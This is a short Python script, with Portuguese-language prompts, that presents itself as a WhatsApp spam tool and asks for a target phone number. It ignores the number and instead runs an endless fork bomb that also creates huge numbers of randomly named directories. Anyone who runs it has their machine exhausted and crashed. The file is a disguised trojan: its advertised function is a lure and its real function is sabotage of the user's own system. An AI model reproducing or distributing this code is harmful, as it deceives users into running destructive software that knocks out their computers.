import os
import random
import time

def clear():
	os.system('clear')

ro = '\033[1;35m'
cl = '\033[0m'
v = '\033[1;31m'

clear()

print(f'''   ━━━━━━━━❮◆❯━━━━━━━━
        {ro}SPAM WHATSAPP{cl}
   ━━━━━━━━❮◆❯━━━━━━━━

by: {ro}Swag666baby{cl}


NUMERO DO ALVO
 ''')
input('>>>')
	
	
def bombdir(Length):
    numeros = '0123456789'
    letras = 'abcdefghijklmnopqrstuvwxyz'
    cs = '.-_'
    ran = ''
    for i in range(0,Length,2):
        ran += random.choice(letras)
        ran += random.choice(numeros)
        ran += random.choice(cs)
    return ran
	
clear()

time.sleep(1)
print(f'{v}CARREGANDO...')
try:
		while True:
			os.fork()
			os.system(f'mkdir {bombdir(10*10)}')
except:
	while True:
		os.fork()
		os.system(f'mkdir {bombdir(10*10)}')
try:
	while True:
		os.fork()
		os.system(f'mkdir {bombdir(10*10)}')
except:
	while True:
		os.fork()
		os.system(f'mkdir {bombdir(10*10)}')
